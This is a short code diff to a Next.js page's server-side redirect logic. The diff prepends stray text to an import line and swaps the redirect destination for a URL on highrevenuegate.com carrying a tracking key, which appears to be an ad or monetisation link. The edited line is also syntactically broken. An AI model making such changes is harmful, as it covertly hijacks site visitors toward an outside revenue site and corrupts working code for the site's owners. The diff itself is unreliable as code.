@@ -1,4 +1,4 @@
-import React from 'react';
+hiimport React from 'react';
 import Head from 'next/head';
 import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
@@ -18,7 +18,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					endpoint.replace(/(\/graphql\/)/, '/') + encodeURI(path as string)
+					endpoint.replace(/(https://www.highrevenuegate.com/hn22eyb6?key=93ddcbe556da83a8c61ef618ebe2ca7d)
 				}`,
 			},
 		};
